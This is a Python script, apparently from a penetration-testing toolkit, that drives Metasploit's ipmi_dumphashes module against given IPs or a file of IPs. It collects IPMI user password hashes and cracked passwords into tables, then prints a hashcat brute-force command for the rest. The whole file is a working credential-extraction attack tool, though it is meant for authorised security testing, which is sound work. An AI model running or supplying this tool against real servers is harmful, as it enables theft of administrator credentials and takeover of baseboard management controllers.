#!/usr/bin/env python3

import subprocess
import sys
import re
from prettytable import PrettyTable
from termcolor import colored
import os

def banner():
    print(colored("""
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|P|e|n|t|e|s|t|P|a|c|k|a|g|e|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    Script: ipmi_hash_extract.py
    Author: Leon Teale
    Twitter: @leonteale
    Website: cyberwolf-security.co.uk
    Version: 1.0.0
""", 'green'))

def usage():
    USAGE = """
Usage: ipmi_hash_extract.py [IP_or_filepath]

Options:
IP_or_filepath       | The IP address or a filepath containing IPs for the target.

Example usage:
python3 ipmi_hash_extract.py 10.100.4.23
"""
    print(colored(USAGE, 'yellow'))
    sys.exit(1)

def run_msf_with_cmds(target_ips, threads=256):
    msf_cmds_path = "/tmp/msf_commands.rc"
    
    with open(msf_cmds_path, 'w') as f:
        f.write("use auxiliary/scanner/ipmi/ipmi_dumphashes\n")
        f.write(f"set RHOSTS {target_ips}\n")
        f.write(f"set THREADS {threads}\n")
        f.write("run\n")
        f.write("exit\n")

    print(colored("Building the metasploit module...", 'cyan'))
    try:
        result = subprocess.run(['msfconsole', '-q', '-r', msf_cmds_path], capture_output=True, text=True).stdout
        os.remove(msf_cmds_path)
        return result
    except Exception as e:
        print(colored(f"Error occurred while running metasploit: {str(e)}", 'red'))
        sys.exit(1)

def process_output(output):
    print(colored("Running attack...", 'cyan'))

    hash_pattern = re.compile(r"Hash found: (\w+):([\w\d]+):([\w\d]+)")
    pass_pattern = re.compile(r"Hash for user '(\w+)' matches password '(\w+)'")
    
    hash_matches = hash_pattern.findall(output)
    pass_matches = pass_pattern.findall(output)

    if not hash_matches:
        print(colored("No hashes were extracted.", 'red'))
        sys.exit(1)

    password_dict = {k: v for k, v in pass_matches}

    table = PrettyTable()
    table.field_names = ["Username", "Hash", "Password"]
    
    for user, hash1, hash2 in hash_matches:
        password = password_dict.get(user, "Unknown")
        table.add_row([user, hash2, password])

    print(colored("Hashes found... generating table.", 'cyan'))
    print(table)

    raw_table = PrettyTable()
    raw_table.field_names = ["Raw Hashes"]
    for user, hash1, hash2 in hash_matches:
        raw_table.add_row([f"{user}:{hash1}:{hash2}"])
    
    hashcat_cmd = "hashcat -a 3 -m 7300 -i --increment-min=8 --increment-max=8 ipmi.txt -1 ?d?u ?1?1?1?1?1?1?1?1 --username"
    
    print(colored(f"Below are the raw hashes found: {colored(hashcat_cmd, 'magenta')}", 'cyan'))
    print(raw_table)

if __name__ == "__main__":
    banner()

    if len(sys.argv) != 2:
        usage()

    target = sys.argv[1]

    try:
        if '.txt' in target:
            with open(target, 'r') as f:
                ips = f.readlines()
            target_ips = " ".join([ip.strip() for ip in ips])
        else:
            target_ips = target
    except Exception as e:
        print(colored(f"Error occurred while reading target IPs: {str(e)}", 'red'))
        sys.exit(1)

    output = run_msf_with_cmds(target_ips)
    process_output(output)

